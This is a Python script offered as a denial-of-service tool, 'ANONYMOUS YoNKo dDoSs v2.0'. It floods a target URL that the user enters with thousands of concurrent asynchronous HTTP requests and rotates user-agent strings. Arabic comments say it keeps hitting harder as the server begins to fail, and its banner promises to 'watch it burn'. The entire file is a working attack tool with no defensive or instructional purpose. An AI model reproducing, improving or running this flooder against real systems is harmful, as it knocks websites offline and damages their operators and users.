import asyncio
import aiohttp
import os
import sys
import time
import random

# ألوان الدمار والجحيم (Blood Red Theme)
RED = "\033[31m"
DARK_RED = "\033[38;5;88m"
BLOOD = "\033[38;5;124m"
BOLD = "\033[1m"
RESET = "\033[0m"
GLITCH = "\033[5m"

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{DARK_RED}{BOLD}")
    print(r"""
     █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗
    ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝
    ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
    ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
    ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║
    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
    """)
    print(f"{GLITCH}{BLOOD}              [☠] TOOL: ANONYMOUS YoNKo dDoSs v2.0 [☠]{RESET}")
    print(f"{RED}              [☠] Tik tok: @youareanony | MODE: ASYNC FLOOD [☠]")
    print(f"{DARK_RED}    " + "—" * 78 + f"{RESET}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

# إرسال طلبات سريعة جداً بدون انتظار الرد
async def send_packet(session, target):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Cache-Control': 'no-cache',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    while True:
        try:
            # نبعثو الطلب ومستنيوش الإجابة كاملة لربح الوقت والسرعة
            async with session.get(target, headers=headers, timeout=3) as response:
                await response.release()
        except:
            # إذا بدأ السيرفر يسقط ويخرج Errors، الكود يكمل يضرب بقوة أكبر
            pass

async def start_attack(target, power):
    banner()
    print(f"{BLOOD}[*] Injected {power} Async Tasks. Waking up the Void...{RESET}")
    time.sleep(1.5)
    print(f"{GLITCH}{RED}[!!!] EXECUTING CRITICAL FLOOD... WATCH IT BURN... [!!!]{RESET}\n")

    # فتح Session وحدة سريعة تتعامل مع آلاف الطلبات في نفس الوقت
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(power):
            tasks.append(asyncio.create_task(send_packet(session, target)))
        
        # تشغيل الهجوم الفعلي
        await asyncio.gather(*tasks)

def main():
    banner()
    target = input(f"{BOLD}{RED}[+] Enter Target URL (ex: http://test.com): {RESET}")
    if not target.startswith("http"):
        target = "http://" + target
        
    try:
        power = int(input(f"{BOLD}{RED}[+] Enter Attack Power (Async Tasks) [Default 1000]: {RESET}"))
    except:
        power = 5000

    try:
        asyncio.run(start_attack(target, power))
    except KeyboardInterrupt:
        print(f"\n\n{BLOOD}[!] ATTACK HALTED. TIME TO BUILD THE PROTECTION.{RESET}")

if __name__ == "__main__":
    main()
